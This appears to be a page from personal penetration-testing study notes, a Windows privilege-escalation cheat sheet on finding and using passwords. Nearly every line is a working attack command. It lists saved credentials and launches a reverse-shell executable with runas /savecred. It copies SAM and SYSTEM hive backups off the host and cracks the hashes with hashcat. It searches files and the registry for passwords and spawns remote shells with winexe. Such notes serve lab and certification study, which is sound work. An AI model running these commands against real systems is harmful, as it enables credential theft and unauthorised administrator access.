---
title: Passwords
parent: Method (Windows)
layout: default
nav_order: 3
---

## Saved Credentials
1. quick check: `winpeas.exe quiet cmd windowscreds`
2. verify: `cmdkey /list`
3. use to run a shell: `runas /savecred /user:administrator C:\PrivEsc\reverse.exe`

## SAM
1. Usually not readable, but backup may exists at:\
   `C:\Windows\Repair`
   `C:\Windows\System32\config\RegBack`
2. Copy both SAM and SYSTEM back to Kali
3. Obtain the hash: `python pwdump.py SYSTEM SAM` (pipenv please)
4. Crack using hashcat: `hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/seclists/rockyou.txt`

## Configuration Files
1. Auto search: `winpeas.exe quiet cmd searchfast filesinfo`
2. Manual search: `findstr /si password *.xml *.ini *.txt`
3. Spawn shell using credentials: `winexe -U 'admin%password123' //192.168.1.22 cmd.exe`

## Registry Password
1. check here: `reg query HKLM /f password /t REG_SZ /s` and also `reg query HKCU /f password /t REG_SZ /s` (not recommended as usually will have a lot of results)
2. `winpeas.exe quiet filesinfo userinfo` (long time to complete)
3. Spawn shell using credentials: `winexe -U 'admin%password123' //192.168.1.22 cmd.exe`